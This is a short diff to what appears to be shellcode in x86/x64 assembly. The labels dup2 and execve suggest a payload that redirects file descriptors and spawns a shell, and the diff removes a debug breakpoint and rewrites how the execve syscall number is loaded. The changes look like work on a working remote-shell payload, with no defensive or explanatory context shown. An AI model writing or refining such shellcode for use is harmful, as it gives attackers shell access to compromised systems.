@@ -122,8 +122,9 @@ x86_dup2:
     int     0x80
     
 x84_execve:
-int3
     cdq                 ; edx = 0
+    push    eax
+    pop     esi
     push    eax         ; '\0'
     push    eax         ; null space
     push    eax         ; null space
@@ -139,7 +140,8 @@ int3
     syscall
 x86_execve:
     xor     ecx, ecx    ; argv = NULL
-    add     al, 12      ; eax  = sys_execve
+    push    11
+    pop     eax         ; eax  = sys_execve
     int     0x80
     
     
